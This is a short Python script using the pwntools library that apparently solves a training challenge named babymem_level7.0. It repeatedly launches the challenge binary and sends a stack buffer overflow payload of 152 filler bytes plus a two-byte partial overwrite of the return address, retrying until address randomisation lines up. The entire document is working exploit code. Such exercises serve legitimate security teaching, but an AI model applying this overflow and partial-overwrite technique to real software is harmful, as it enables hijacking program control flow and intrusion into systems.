
import pwn
while True:
	proc = pwn.process("/challenge/babymem_level7.0")
	proc.recvuntil("size:")
	proc.sendline("154")
	#ret_addr = pwn.p64(0x562addea28fc, endian='little')
	payload = b"a"*152 + b"\xfc\x18"
	proc.recvuntil("bytes)!")
	proc.send(payload)
	proc.interactive()
